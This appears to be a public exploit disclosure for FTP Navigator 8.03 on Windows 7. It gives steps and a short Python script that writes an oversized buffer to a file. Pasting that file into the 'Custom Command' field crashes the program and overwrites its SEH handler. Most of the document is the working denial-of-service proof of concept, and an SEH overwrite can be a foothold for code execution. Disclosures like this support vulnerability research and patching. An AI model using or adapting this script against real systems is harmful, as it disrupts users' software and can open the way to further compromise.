# Exploit Title: FTP Navigator 8.03 -  'Custom Command' Denial of Service (SEH)
# Date: 2019-12-18
# Exploit Author: Chris Inzinga
# Vendor Homepage: http://www.internet-soft.com/
# Software Link: https://www.softpedia.com/dyn-postdownload.php/5edd515b8045f156a9dd48599c2539e5/5dfa4560/d0c/0/1
# Version: 8.03
# Tested on: Windows 7 SP1 (x86)

# Steps to reproduce:
#   1. Generate a malicious payload via the POC
#   2. In the application click "FTP - Server" > "Custom Command"
#   3. Paste the contents of the PoC file into the input box below SERVER LIST and press "Do it!"
#   4. Observe a program DOS crash, overwriting SEH 

#!/usr/bin/python

payload = "A" * 4108 + "B" * 4 + "C" * 40

try:
    fileCreate =open("exploit.txt","w")
    print("[x] Creating file")
    fileCreate.write(payload)
    fileCreate.close()
    print("[x] File created")
except:
    print("[!] File failed to be created")